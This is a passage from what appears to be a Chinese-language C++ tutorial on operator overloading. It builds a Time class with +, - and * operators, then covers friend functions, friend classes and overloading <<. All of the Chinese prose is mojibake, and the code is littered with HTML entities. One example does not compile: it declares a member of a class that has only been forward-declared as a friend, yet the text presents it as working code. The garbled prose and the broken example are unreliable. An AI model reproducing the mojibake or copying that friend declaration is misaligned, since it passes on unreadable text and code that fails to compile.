right.data; // å‡è®¾æœ‰ data æˆå‘˜ return result;&#125;// ä½¿ç”¨MyClass obj1, obj2;MyClass sum = obj1 + obj2; // å®é™…è°ƒç”¨ operator+(obj1, obj2) æ³¨æ„äº‹é¡¹: ä¸èƒ½åˆ›å»ºæ–°çš„è¿ç®—ç¬¦: ä½ åªèƒ½é‡è½½ C++ ä¸­å·²æœ‰çš„è¿ç®—ç¬¦ï¼Œä¸èƒ½å‘æ˜æ–°çš„è¿ç®—ç¬¦ï¼ˆæ¯”å¦‚ ** æˆ– ##ï¼‰ã€‚ ä¸èƒ½æ”¹å˜è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§æˆ–ç»“åˆæ€§: é‡è½½ + å’Œ * åï¼Œ* çš„ä¼˜å…ˆçº§ä»ç„¶é«˜äº +ã€‚ ä¸èƒ½æ”¹å˜è¿ç®—ç¬¦çš„æ“ä½œæ•°ä¸ªæ•°: ä¸èƒ½å°†äºŒå…ƒè¿ç®—ç¬¦é‡è½½ä¸ºä¸€å…ƒè¿ç®—ç¬¦ï¼Œåä¹‹äº¦ç„¶ã€‚ è‡³å°‘ä¸€ä¸ªæ“ä½œæ•°æ˜¯ç”¨æˆ·å®šä¹‰ç±»å‹: ä¸èƒ½ä¸ºä¸¤ä¸ªå†…ç½®ç±»å‹ï¼ˆå¦‚ int å’Œ intï¼‰é‡è½½è¿ç®—ç¬¦ã€‚è¿ç®—ç¬¦é‡è½½å¿…é¡»æ¶‰åŠè‡³å°‘ä¸€ä¸ªç±»å¯¹è±¡ï¼ˆæˆ–æšä¸¾ç±»å‹ï¼‰ã€‚ æŸäº›è¿ç®—ç¬¦ä¸èƒ½é‡è½½: . (æˆå‘˜è®¿é—®è¿ç®—ç¬¦) .* (æˆå‘˜æŒ‡é’ˆè®¿é—®è¿ç®—ç¬¦) :: (ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦) sizeof (å¤§å°è¿ç®—ç¬¦) ?: (æ¡ä»¶è¿ç®—ç¬¦) typeid (è¿è¡Œæ—¶ç±»å‹è¯†åˆ«è¿ç®—ç¬¦) static_cast, dynamic_cast, const_cast, reinterpret_cast (ç±»å‹è½¬æ¢è¿ç®—ç¬¦ï¼Œè™½ç„¶ operator type() å½¢å¼çš„è½¬æ¢å‡½æ•°å¯ä»¥å®šä¹‰) è¿ç®—ç¬¦é‡è½½æ˜¯ C++ æä¾›çš„ä¸€ä¸ªå¼ºå¤§å·¥å…·ï¼Œå¯ä»¥ä½¿è‡ªå®šä¹‰ç±»çš„ä½¿ç”¨æ›´åŠ è‡ªç„¶å’Œæ–¹ä¾¿ã€‚ç„¶è€Œï¼Œä¹Ÿåº”è°¨æ…ä½¿ç”¨ï¼Œé¿å…è¿‡åº¦æˆ–ä¸ç›´è§‚çš„é‡è½½ï¼Œä»¥å…é™ä½ä»£ç çš„å¯è¯»æ€§ã€‚æ¥ä¸‹æ¥çš„ç« èŠ‚å°†é€šè¿‡å…·ä½“çš„ä¾‹å­æ¥æ¼”ç¤ºå¦‚ä½•é‡è½½ä¸åŒçš„è¿ç®—ç¬¦ã€‚ 11.2 è®¡ç®—æ—¶é—´ï¼šä¸€ä¸ªè¿ç®—ç¬¦é‡è½½ç¤ºä¾‹ä¸ºäº†å…·ä½“è¯´æ˜è¿ç®—ç¬¦é‡è½½çš„è¿‡ç¨‹å’Œç”¨æ³•ï¼Œè®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®€å•çš„ Time ç±»æ¥è¡¨ç¤ºæ—¶é—´ï¼ˆå°æ—¶å’Œåˆ†é’Ÿï¼‰ï¼Œå¹¶ä¸ºå…¶é‡è½½ä¸€äº›è¿ç®—ç¬¦ã€‚ åŸºç¡€ Time ç±»: é¦–å…ˆï¼Œæˆ‘ä»¬å®šä¹‰ä¸€ä¸ªåŸºç¡€çš„ Time ç±»ï¼ŒåŒ…å«å°æ—¶å’Œåˆ†é’Ÿï¼Œä¸€ä¸ªæ„é€ å‡½æ•°æ¥åˆå§‹åŒ–æ—¶é—´ï¼Œä»¥åŠä¸€ä¸ª show() æ–¹æ³•æ¥æ˜¾ç¤ºæ—¶é—´ã€‚ 12345678910111213141516171819202122232425// time.h -- Time ç±»å®šä¹‰#ifndef TIME_H_#define TIME_H_#include &lt;iostream&gt;class Time &#123;private: int hours; int minutes;public: // æ„é€ å‡½æ•°ï¼Œé»˜è®¤å€¼ä¸º 0 æ—¶ 0 åˆ† Time(int h = 0, int m = 0); // æ·»åŠ åˆ†é’Ÿæ•°çš„æ–¹æ³• (å†…éƒ¨ä¼šå¤„ç†è¿›ä½) void AddMin(int m); // æ·»åŠ å°æ—¶æ•°çš„æ–¹æ³• void AddHr(int h); // é‡ç½®æ—¶é—´ä¸º 0 æ—¶ 0 åˆ† void Reset(int h = 0, int m = 0); // æ˜¾ç¤ºæ—¶é—´ void Show() const;&#125;;#endif // TIME_H_ 123456789101112131415161718192021222324252627// time.cpp -- Time ç±»æ–¹æ³•å®ç°#include &quot;time.h&quot;Time::Time(int h, int m) &#123; hours = h; minutes = m; // å¯ä»¥æ·»åŠ ä¸€äº›éªŒè¯é€»è¾‘ï¼Œä¾‹å¦‚ç¡®ä¿åˆ†é’Ÿæ•°å°äº60&#125;void Time::AddMin(int m) &#123; minutes += m; hours += minutes / 60; // æ•´æ•°é™¤æ³•ï¼Œè®¡ç®—å¢åŠ çš„å°æ—¶æ•° minutes %= 60; // å–æ¨¡ï¼Œå¾—åˆ°å‰©ä½™çš„åˆ†é’Ÿæ•°&#125;void Time::AddHr(int h) &#123; hours += h;&#125;void Time::Reset(int h, int m) &#123; hours = h; minutes = m;&#125;void Time::Show() const &#123; std::cout &lt;&lt; hours &lt;&lt; &quot; hours, &quot; &lt;&lt; minutes &lt;&lt; &quot; minutes&quot;;&#125; è¿™ä¸ªåŸºç¡€ç±»å…è®¸æˆ‘ä»¬åˆ›å»º Time å¯¹è±¡å¹¶å¯¹å…¶è¿›è¡Œä¸€äº›åŸºæœ¬æ“ä½œï¼Œä½†è¿˜ä¸èƒ½ç›´æ¥ä½¿ç”¨ + ç­‰è¿ç®—ç¬¦ã€‚ 11.2.1 æ·»åŠ åŠ æ³•è¿ç®—ç¬¦æˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿåƒ total = time1 + time2; è¿™æ ·å°†ä¸¤ä¸ª Time å¯¹è±¡ç›¸åŠ ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦é‡è½½ + è¿ç®—ç¬¦ã€‚æˆ‘ä»¬å°†å®ƒå®ç°ä¸º Time ç±»çš„æˆå‘˜å‡½æ•°ã€‚ åœ¨ time.h ä¸­æ·»åŠ å£°æ˜: 1234567891011121314151617181920212223// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.h// ... (åŒ…å« guards å’Œ iostream) ...class Time &#123;private: int hours; int minutes;public: Time(int h = 0, int m = 0); void AddMin(int m); void AddHr(int h); void Reset(int h = 0, int m = 0); void Show() const; // é‡è½½åŠ æ³•è¿ç®—ç¬¦ (+) ä½œä¸ºæˆå‘˜å‡½æ•° // å‚æ•° t ä»£è¡¨åŠ å·å³è¾¹çš„ Time å¯¹è±¡ // const å…³é”®å­—è¡¨ç¤ºè¿™ä¸ªå‡½æ•°ä¸ä¼šä¿®æ”¹è°ƒç”¨å®ƒçš„å¯¹è±¡ (åŠ å·å·¦è¾¹çš„å¯¹è±¡) // è¿”å›ä¸€ä¸ªæ–°çš„ Time å¯¹è±¡ä½œä¸ºç»“æœ Time operator+(const Time &amp; t) const;&#125;;// ... (endif) ... åœ¨ time.cpp ä¸­æ·»åŠ å®šä¹‰: 12345678910111213// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.cpp#include &quot;time.h&quot;// ... (æ„é€ å‡½æ•°å’Œå…¶ä»–æ–¹æ³•çš„å®šä¹‰) ...// å®šä¹‰é‡è½½çš„åŠ æ³•è¿ç®—ç¬¦Time Time::operator+(const Time &amp; t) const &#123; Time sum; // åˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„ Time å¯¹è±¡æ¥å­˜å‚¨ç»“æœ sum.minutes = minutes + t.minutes; // å°†ä¸¤ä¸ªå¯¹è±¡çš„åˆ†é’Ÿæ•°ç›¸åŠ  sum.hours = hours + t.hours + sum.minutes / 60; // å°†å°æ—¶æ•°ç›¸åŠ ï¼Œå¹¶åŠ ä¸Šåˆ†é’Ÿè¿›ä½çš„å°æ—¶ sum.minutes %= 60; // è°ƒæ•´ç»“æœçš„åˆ†é’Ÿæ•° return sum; // è¿”å›ç»“æœå¯¹è±¡&#125; ä½¿ç”¨é‡è½½çš„ + è¿ç®—ç¬¦: 1234567891011121314151617181920212223242526272829// main.cpp -- ä½¿ç”¨ Time ç±»å’Œé‡è½½çš„ +#include &lt;iostream&gt;#include &quot;time.h&quot;int main() &#123; Time planning(2, 40); // 2 å°æ—¶ 40 åˆ†é’Ÿ Time coding(5, 55); // 5 å°æ—¶ 55 åˆ†é’Ÿ Time fixing(1, 30); // 1 å°æ—¶ 30 åˆ†é’Ÿ Time total; std::cout &lt;&lt; &quot;Planning time = &quot;; planning.Show(); std::cout &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Coding time = &quot;; coding.Show(); std::cout &lt;&lt; std::endl; // ä½¿ç”¨é‡è½½çš„ + è¿ç®—ç¬¦ std::cout &lt;&lt; &quot;Calculating total time...\\n&quot;; total = planning + coding + fixing; // ç›¸å½“äº (planning.operator+(coding)).operator+(fixing) // æ˜¾ç¤ºæ€»æ—¶é—´ std::cout &lt;&lt; &quot;Total time = &quot;; total.Show(); std::cout &lt;&lt; std::endl; return 0;&#125; ç¼–è¯‘å’Œè¿è¡Œ:(éœ€è¦å°† main.cpp å’Œ time.cpp ä¸€èµ·ç¼–è¯‘é“¾æ¥) è¾“å‡º: 1234Planning time &#x3D; 2 hours, 40 minutesCoding time &#x3D; 5 hours, 55 minutesCalculating total time...Total time &#x3D; 10 hours, 5 minutes å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡é‡è½½ + è¿ç®—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨éå¸¸è‡ªç„¶çš„æ–¹å¼å°† Time å¯¹è±¡ç›¸åŠ ã€‚ 11.2.2 é‡è½½é™åˆ¶é‡è½½è¿ç®—ç¬¦æ—¶å¿…é¡»éµå®ˆä¸€äº›è§„åˆ™å’Œé™åˆ¶ï¼š ä¸èƒ½åˆ›å»ºæ–°è¿ç®—ç¬¦: åªèƒ½é‡è½½ C++ å·²æœ‰çš„è¿ç®—ç¬¦ã€‚ ä¸èƒ½æ”¹å˜è¿ç®—ç¬¦ä¼˜å…ˆçº§å’Œç»“åˆæ€§: * æ€»æ˜¯ä¼˜å…ˆäº +ã€‚ ä¸èƒ½æ”¹å˜è¿ç®—ç¬¦æ“ä½œæ•°ä¸ªæ•°: äºŒå…ƒè¿ç®—ç¬¦ï¼ˆå¦‚ +ï¼‰å¿…é¡»æ¥å—ä¸¤ä¸ªæ“ä½œæ•°ï¼Œä¸€å…ƒè¿ç®—ç¬¦ï¼ˆå¦‚ - (è´Ÿå·)ï¼‰å¿…é¡»æ¥å—ä¸€ä¸ªæ“ä½œæ•°ã€‚ è‡³å°‘ä¸€ä¸ªæ“ä½œæ•°æ˜¯ç”¨æˆ·å®šä¹‰ç±»å‹: ä¸èƒ½ä¸ºä¸¤ä¸ª int é‡è½½ + è¿ç®—ç¬¦ã€‚é‡è½½å¿…é¡»æ¶‰åŠè‡³å°‘ä¸€ä¸ªç±»å¯¹è±¡ï¼ˆæˆ–æšä¸¾ï¼‰ã€‚ ç‰¹å®šè¿ç®—ç¬¦ä¸èƒ½é‡è½½: å¦‚ .ã€::ã€sizeofã€?: ç­‰ã€‚ ä¿æŒç›´è§‚æ€§: é‡è½½åº”è¯¥ç¬¦åˆè¿ç®—ç¬¦çš„é€šå¸¸å«ä¹‰ã€‚ä¾‹å¦‚ï¼Œç”¨ + æ¥è¡¨ç¤ºä¸¤ä¸ªå¯¹è±¡çš„ç›¸å‡ä¼šéå¸¸ä»¤äººå›°æƒ‘ã€‚è™½ç„¶è¯­æ³•ä¸Šå…è®¸ï¼Œä½†è¿™æ˜¯ä¸è‰¯å®è·µã€‚ 11.2.3 å…¶ä»–é‡è½½è¿ç®—ç¬¦æˆ‘ä»¬å¯ä»¥ä¸º Time ç±»é‡è½½æ›´å¤šçš„è¿ç®—ç¬¦ï¼Œä½¿å…¶åŠŸèƒ½æ›´å®Œå–„ã€‚ é‡è½½å‡æ³•è¿ç®—ç¬¦ (-) ä½œä¸ºæˆå‘˜å‡½æ•°: 1234567891011// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.h// ... existing code ...class Time &#123; // ... existing members ...public: // ... existing methods ... Time operator+(const Time &amp; t) const; // å£°æ˜é‡è½½å‡æ³•è¿ç®—ç¬¦ (-) Time operator-(const Time &amp; t) const;&#125;;// ... existing code ... 1234567891011121314151617181920// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.cpp// ... existing code ...// å®šä¹‰é‡è½½çš„å‡æ³•è¿ç®—ç¬¦Time Time::operator-(const Time &amp; t) const &#123; Time diff; int tot1, tot2; // å°†æ—¶é—´éƒ½è½¬æ¢ä¸ºæ€»åˆ†é’Ÿæ•°è¿›è¡Œè®¡ç®— tot1 = t.minutes + 60 * t.hours; tot2 = minutes + 60 * hours; // ç¡®ä¿ç»“æœéè´Ÿ (ç®€å•å¤„ç†ï¼Œå®é™…å¯èƒ½éœ€è¦æ›´å¤æ‚çš„é€»è¾‘) if (tot2 &lt; tot1) &#123; std::cerr &lt;&lt; &quot;Warning: subtraction result is negative. Resetting to 0.\\n&quot;; diff.hours = diff.minutes = 0; &#125; else &#123; diff.minutes = (tot2 - tot1) % 60; diff.hours = (tot2 - tot1) / 60; &#125; return diff;&#125; é‡è½½ä¹˜æ³•è¿ç®—ç¬¦ (*) - æ—¶é—´ä¹˜ä»¥ä¸€ä¸ªå› å­: å‡è®¾æˆ‘ä»¬æƒ³è®¡ç®— Time å¯¹è±¡ä¹˜ä»¥ä¸€ä¸ª double å› å­ï¼ˆä¾‹å¦‚ï¼Œå°†æ—¶é—´æ”¾å¤§ 1.5 å€ï¼‰ã€‚è¿™ä¸ªè¿ç®—ç¬¦çš„æ“ä½œæ•°ç±»å‹ä¸åŒï¼ˆTime å’Œ doubleï¼‰ï¼Œå¯ä»¥ä½œä¸ºæˆå‘˜å‡½æ•°æˆ–éæˆå‘˜å‡½æ•°å®ç°ã€‚è¿™é‡Œæˆ‘ä»¬ä½œä¸ºæˆå‘˜å‡½æ•°å®ç°ã€‚ 123456789101112// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.h// ... existing code ...class Time &#123; // ... existing members ...public: // ... existing methods ... Time operator+(const Time &amp; t) const; Time operator-(const Time &amp; t) const; // å£°æ˜é‡è½½ä¹˜æ³•è¿ç®—ç¬¦ (*) Time operator*(double mult) const;&#125;;// ... existing code ... 12345678910111213// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.cpp// ... existing code ...// å®šä¹‰é‡è½½çš„ä¹˜æ³•è¿ç®—ç¬¦Time Time::operator*(double mult) const &#123; Time result; // å°†æ—¶é—´è½¬æ¢ä¸ºæ€»åˆ†é’Ÿæ•°ï¼Œä¹˜ä»¥å› å­ï¼Œç„¶åè½¬æ¢å›å°æ—¶å’Œåˆ†é’Ÿ long totalminutes = hours * 60 + minutes; totalminutes *= mult; // ä¹˜ä»¥å› å­ result.hours = totalminutes / 60; result.minutes = totalminutes % 60; return result;&#125; ä½¿ç”¨ç¤ºä¾‹: 123456789101112131415161718192021222324// main.cpp (ç»­)#include &lt;iostream&gt;#include &quot;time.h&quot;int main() &#123; Time t1(2, 30); // 2 hours, 30 minutes Time t2(1, 45); // 1 hours, 45 minutes Time diff, product; double factor = 1.5; std::cout &lt;&lt; &quot;t1 = &quot;; t1.Show(); std::cout &lt;&lt; std::endl; std::cout &lt;&lt; &quot;t2 = &quot;; t2.Show(); std::cout &lt;&lt; std::endl; diff = t1 - t2; // ä½¿ç”¨é‡è½½çš„ - std::cout &lt;&lt; &quot;t1 - t2 = &quot;; diff.Show(); std::cout &lt;&lt; std::endl; product = t1 * factor; // ä½¿ç”¨é‡è½½çš„ * std::cout &lt;&lt; &quot;t1 * &quot; &lt;&lt; factor &lt;&lt; &quot; = &quot;; product.Show(); std::cout &lt;&lt; std::endl; // æ³¨æ„ï¼šæˆ‘ä»¬æ²¡æœ‰å®šä¹‰ double * Timeï¼Œæ‰€ä»¥ä¸‹é¢çš„å†™æ³•ä¼šæŠ¥é”™ // product = factor * t1; // é”™è¯¯! éœ€è¦éæˆå‘˜å‡½æ•°æˆ–è½¬æ¢å‡½æ•° return 0;&#125; è¾“å‡º (ç»­): 1234t1 &#x3D; 2 hours, 30 minutest2 &#x3D; 1 hours, 45 minutest1 - t2 &#x3D; 0 hours, 45 minutest1 * 1.5 &#x3D; 3 hours, 45 minutes è¿™ä¸ªä¾‹å­å±•ç¤ºäº†å¦‚ä½•é€šè¿‡é‡è½½è¿ç®—ç¬¦ï¼Œè®©è‡ªå®šä¹‰çš„ Time ç±»èƒ½å¤Ÿä»¥æ›´è‡ªç„¶ã€æ›´ç¬¦åˆæ•°å­¦ç›´è§‰çš„æ–¹å¼è¿›è¡Œè¿ç®—ã€‚ä¸‹ä¸€èŠ‚å°†è®¨è®ºå‹å…ƒå‡½æ•°ï¼Œç‰¹åˆ«æ˜¯å¦‚ä½•ä½¿ç”¨å‹å…ƒå‡½æ•°æ¥é‡è½½åƒ &lt;&lt; è¿™æ ·çš„è¾“å‡ºè¿ç®—ç¬¦ï¼Œä»¥åŠå¤„ç†åƒ double * Time è¿™æ ·çš„è¿ç®—é¡ºåºé—®é¢˜ã€‚ 11.3 å‹å…ƒé€šå¸¸ï¼Œç±»çš„ç§æœ‰æˆå‘˜ï¼ˆprivateï¼‰åªèƒ½è¢«è¯¥ç±»çš„æˆå‘˜å‡½æ•°è®¿é—®ã€‚è¿™æ˜¯ C++ å®ç°å°è£…å’Œæ•°æ®éšè—çš„å…³é”®æœºåˆ¶ã€‚ç„¶è€Œï¼Œåœ¨æŸäº›ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œå…è®¸ç‰¹å®šçš„éæˆå‘˜å‡½æ•°æˆ–å…¶ä»–ç±»è®¿é—®ä¸€ä¸ªç±»çš„ç§æœ‰æˆå‘˜ä¼šéå¸¸æ–¹ä¾¿ã€‚C++ æä¾›äº†å‹å…ƒ (friend) æœºåˆ¶æ¥å®ç°è¿™ç§å—æ§çš„è®¿é—®ã€‚ ä»€ä¹ˆæ˜¯å‹å…ƒï¼Ÿ å‹å…ƒæ˜¯ C++ ä¸­çš„ä¸€ç§æœºåˆ¶ï¼Œå®ƒå…è®¸ä¸€ä¸ªç±»æˆäºˆéæˆå‘˜å‡½æ•°æˆ–å¦ä¸€ä¸ªç±»è®¿é—®å…¶ private å’Œ protected æˆå‘˜çš„æƒé™ã€‚è¢«æˆäºˆæƒé™çš„å‡½æ•°æˆ–ç±»è¢«ç§°ä¸ºè¯¥ç±»çš„å‹å…ƒã€‚ æ³¨æ„: å‹å…ƒå…³ç³»æ˜¯å•å‘çš„ï¼Œå¹¶ä¸”ä¸èƒ½è¢«ç»§æ‰¿ã€‚å¦‚æœç±» A å°†å‡½æ•° func() å£°æ˜ä¸ºå‹å…ƒï¼Œfunc() å¯ä»¥è®¿é—® A çš„ç§æœ‰æˆå‘˜ï¼Œä½†è¿™å¹¶ä¸æ„å‘³ç€ A å¯ä»¥è®¿é—® func() çš„å†…éƒ¨ï¼ˆå¦‚æœ func æ˜¯å¦ä¸€ä¸ªç±»çš„æˆå‘˜ï¼‰ï¼Œä¹Ÿä¸æ„å‘³ç€ A çš„æ´¾ç”Ÿç±»ä¼šè‡ªåŠ¨å°† func() è§†ä¸ºå‹å…ƒã€‚ 11.3.1 åˆ›å»ºå‹å…ƒè¦å°†ä¸€ä¸ªå‡½æ•°æˆ–å¦ä¸€ä¸ªç±»å£°æ˜ä¸ºå½“å‰ç±»çš„å‹å…ƒï¼Œéœ€è¦åœ¨å½“å‰ç±»çš„å®šä¹‰å†…éƒ¨ä½¿ç”¨ friend å…³é”®å­—è¿›è¡Œå£°æ˜ã€‚ 1. å‹å…ƒå‡½æ•° (Friend Function): å‹å…ƒå‡½æ•°å¯ä»¥æ˜¯æ™®é€šçš„éæˆå‘˜å‡½æ•°ï¼Œä¹Ÿå¯ä»¥æ˜¯å¦ä¸€ä¸ªç±»çš„æˆå‘˜å‡½æ•°ã€‚ å£°æ˜æ™®é€šéæˆå‘˜å‡½æ•°ä¸ºå‹å…ƒ: 1234567891011121314151617181920class MyClass &#123;private: int secret;public: MyClass(int s = 0) : secret(s) &#123;&#125; // åœ¨ç±»å®šä¹‰å†…éƒ¨å£°æ˜å‹å…ƒå‡½æ•° friend void showSecret(const MyClass&amp; obj);&#125;;// å®šä¹‰å‹å…ƒå‡½æ•° (æ³¨æ„ï¼šå®ƒä¸æ˜¯æˆå‘˜å‡½æ•°ï¼Œæ²¡æœ‰ MyClass::)void showSecret(const MyClass&amp; obj) &#123; // å› ä¸ºæ˜¯ MyClass çš„å‹å…ƒï¼Œæ‰€ä»¥å¯ä»¥è®¿é—®å…¶ç§æœ‰æˆå‘˜ secret std::cout &lt;&lt; &quot;The secret is: &quot; &lt;&lt; obj.secret &lt;&lt; std::endl;&#125;int main() &#123; MyClass myObj(42); showSecret(myObj); // è°ƒç”¨å‹å…ƒå‡½æ•° return 0;&#125; å£°æ˜å¦ä¸€ä¸ªç±»çš„æˆå‘˜å‡½æ•°ä¸ºå‹å…ƒ: (éœ€è¦æ³¨æ„å£°æ˜é¡ºåºå’Œå‰å‘å£°æ˜) 123456789101112131415161718192021222324252627282930// å‰å‘å£°æ˜ ClassBï¼Œå› ä¸º ClassA çš„å‹å…ƒå£°æ˜ä¸­ç”¨åˆ°äº†å®ƒclass ClassB;class ClassA &#123;private: int dataA;public: ClassA(int d = 0) : dataA(d) &#123;&#125; // å£°æ˜ ClassB çš„æˆå‘˜å‡½æ•° memberB ä¸ºå‹å…ƒ friend void ClassB::memberB(const ClassA&amp; a);&#125;;class ClassB &#123;public: // ClassB çš„æˆå‘˜å‡½æ•°ï¼Œå®ƒå°†æ˜¯ ClassA çš„å‹å…ƒ void memberB(const ClassA&amp; a);&#125;;// å®šä¹‰ ClassB::memberBvoid ClassB::memberB(const ClassA&amp; a) &#123; // å¯ä»¥è®¿é—® ClassA çš„ç§æœ‰æˆå‘˜ dataA std::cout &lt;&lt; &quot;Accessing ClassA data from ClassB: &quot; &lt;&lt; a.dataA &lt;&lt; std::endl;&#125;int main() &#123; ClassA objA(10); ClassB objB; objB.memberB(objA); // è°ƒç”¨ ClassB çš„æˆå‘˜å‡½æ•°ï¼Œè¯¥å‡½æ•°æ˜¯ ClassA çš„å‹å…ƒ return 0;&#125; 2. å‹å…ƒç±» (Friend Class): ä¸€ä¸ªç±»å¯ä»¥å°†å¦ä¸€ä¸ªæ•´ä¸ªç±»å£°æ˜ä¸ºå‹å…ƒã€‚è¿™æ ·ï¼Œå‹å…ƒç±»çš„æ‰€æœ‰æˆå‘˜å‡½æ•°éƒ½å¯ä»¥è®¿é—®å£°æ˜å®ƒä¸ºå‹å…ƒçš„é‚£ä¸ªç±»çš„ private å’Œ protected æˆå‘˜ã€‚ 1234567891011121314151617181920212223class Storage &#123;private: int value; friend class Controller; // å£°æ˜ Controller ä¸ºå‹å…ƒç±»public: Storage(int v = 0) : value(v) &#123;&#125;&#125;;class Controller &#123;public: void manipulateStorage(Storage&amp; s, int newValue) &#123; // å› ä¸º Controller æ˜¯ Storage çš„å‹å…ƒï¼Œå¯ä»¥è®¿é—®å…¶ç§æœ‰æˆå‘˜ value s.value = newValue; std::cout &lt;&lt; &quot;Storage value changed to: &quot; &lt;&lt; s.value &lt;&lt; std::endl; &#125;&#125;;int main() &#123; Storage myStorage(5); Controller myController; myController.manipulateStorage(myStorage, 99); // Controller çš„æ–¹æ³•å¯ä»¥ä¿®æ”¹ Storage çš„ç§æœ‰æ•°æ® return 0;&#125; 11.3.2 å¸¸ç”¨çš„å‹å…ƒï¼šé‡è½½ &lt;&lt; è¿ç®—ç¬¦è¿ç®—ç¬¦é‡è½½æœ€å¸¸è§çš„åº”ç”¨ä¹‹ä¸€å°±æ˜¯é‡è½½**è¾“å‡ºè¿ç®—ç¬¦ &lt;&lt;**ï¼Œä»¥ä¾¿èƒ½å¤Ÿç›´æ¥ä½¿ç”¨ cout æ¥æ‰“å°å¯¹è±¡çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ cout &lt;&lt; myTimeObject;ã€‚ ä¸ºä»€ä¹ˆé€šå¸¸éœ€è¦å‹å…ƒï¼Ÿ è€ƒè™‘ cout &lt;&lt; myTimeObject; è¿™ä¸ªè¡¨è¾¾å¼ã€‚ å®ƒå®é™…ä¸Šæ˜¯è°ƒç”¨ä¸€ä¸ªå½¢å¼ä¸º operator&lt;&lt;(cout, myTimeObject) çš„å‡½æ•°ã€‚ è¿™ä¸ªè¿ç®—ç¬¦çš„å·¦æ“ä½œæ•°æ˜¯ coutï¼ˆä¸€ä¸ª ostream ç±»å‹çš„å¯¹è±¡ï¼‰ï¼Œå³æ“ä½œæ•°æ˜¯æˆ‘ä»¬è¦æ‰“å°çš„å¯¹è±¡ï¼ˆæ¯”å¦‚ Time ç±»å‹çš„å¯¹è±¡ï¼‰ã€‚ å¦‚æœæˆ‘ä»¬å°è¯•å°† operator&lt;&lt; å®šä¹‰ä¸º Time ç±»çš„æˆå‘˜å‡½æ•°ï¼Œé‚£ä¹ˆå®ƒçš„è°ƒç”¨å½¢å¼ä¼šæ˜¯ myTimeObject.operator&lt;&lt;(cout)ã€‚è¿™æ„å‘³ç€ myTimeObject å¿…é¡»æ˜¯å·¦æ“ä½œæ•°ï¼Œè€Œ cout æ˜¯å³æ“ä½œæ•°ï¼Œå³ myTimeObject &lt;&lt; coutã€‚è¿™æ˜¾ç„¶ä¸ç¬¦åˆæˆ‘ä»¬ä¹ æƒ¯çš„ç”¨æ³•ã€‚ å› æ­¤ï¼Œoperator&lt;&lt; å¿…é¡»è¢«é‡è½½ä¸ºéæˆå‘˜å‡½æ•°ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªéæˆå‘˜å‡½æ•°é€šå¸¸éœ€è¦è®¿é—®ç±»çš„ç§æœ‰æ•°æ®æˆå‘˜ï¼ˆå¦‚ Time ç±»çš„ hours å’Œ minutesï¼‰æ¥æ‰“å°å®ƒä»¬ã€‚è¿™å°±ä½¿å¾—å°† operator&lt;&lt; å£°æ˜ä¸ºç±»çš„å‹å…ƒå‡½æ•°æˆä¸ºæœ€è‡ªç„¶ã€æœ€å¸¸ç”¨çš„è§£å†³æ–¹æ¡ˆã€‚ ä¸º Time ç±»é‡è½½ &lt;&lt;: åœ¨ time.h ä¸­å£°æ˜å‹å…ƒå‡½æ•°: 12345678910111213141516171819202122// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.h// ... (åŒ…å« guards å’Œ iostream) ...class Time &#123; // ... private members ...public: // ... constructors and other methods ... Time operator+(const Time &amp; t) const; Time operator-(const Time &amp; t) const; Time operator*(double mult) const; // å£°æ˜å‹å…ƒå‡½æ•° operator&lt;&lt; // ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ ostream å¯¹è±¡çš„å¼•ç”¨ (å¦‚ cout) // ç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦æ‰“å°çš„ Time å¯¹è±¡çš„ const å¼•ç”¨ // è¿”å› ostream å¯¹è±¡çš„å¼•ç”¨ï¼Œä»¥æ”¯æŒé“¾å¼è¾“å‡º (cout &lt;&lt; t1 &lt;&lt; t2) friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const Time &amp; t); // ä¸å†éœ€è¦ Show() æ–¹æ³•ï¼Œå› ä¸º &lt;&lt; æä¾›äº†æ›´å¥½çš„æ–¹å¼ // void Show() const;&#125;;// ... (endif) ... åœ¨ time.cpp ä¸­å®šä¹‰å‹å…ƒå‡½æ•°: (æ³¨æ„ï¼šæ²¡æœ‰ Time:: å‰ç¼€) 1234567891011121314// filepath: d:\\ProgramData\\files_Cpp\\250424\\time.cpp#include &quot;time.h&quot; // ç¡®ä¿åŒ…å«äº† time.h// ... (æ„é€ å‡½æ•°å’Œå…¶ä»–æ–¹æ³•çš„å®šä¹‰) ...// å®šä¹‰å‹å…ƒå‡½æ•° operator&lt;&lt;std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const Time &amp; t) &#123; // å› ä¸ºæ˜¯å‹å…ƒï¼Œå¯ä»¥è®¿é—® t çš„ç§æœ‰æˆå‘˜ hours å’Œ minutes os &lt;&lt; t.hours &lt;&lt; &quot; hours, &quot; &lt;&lt; t.minutes &lt;&lt; &quot; minutes&quot;; return os; // è¿”å› ostream å¼•ç”¨&#125;// å¦‚æœåˆ é™¤äº† Show()ï¼Œéœ€è¦ç§»é™¤å®ƒçš„å®šä¹‰// void Time::Show() const &#123; ... &#125; ä½¿ç”¨é‡è½½çš„ &lt;&lt;: 12345678910111213141516171819// main.cpp -- ä½¿ç”¨é‡è½½çš„ &lt;&lt;#include &lt;iostream&gt;#include &quot;time.h&quot;int main() &#123; Time t1(3, 45); Time t2(2, 15); Time sum = t1 + t2; // ä½¿ç”¨é‡è½½çš„ &lt;&lt; è¿ç®—ç¬¦è¾“å‡º std::cout &lt;&lt; &quot;Time t1: &quot; &lt;&lt; t1 &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Time t2: &quot; &lt;&lt; t2 &lt;&lt; std::endl; 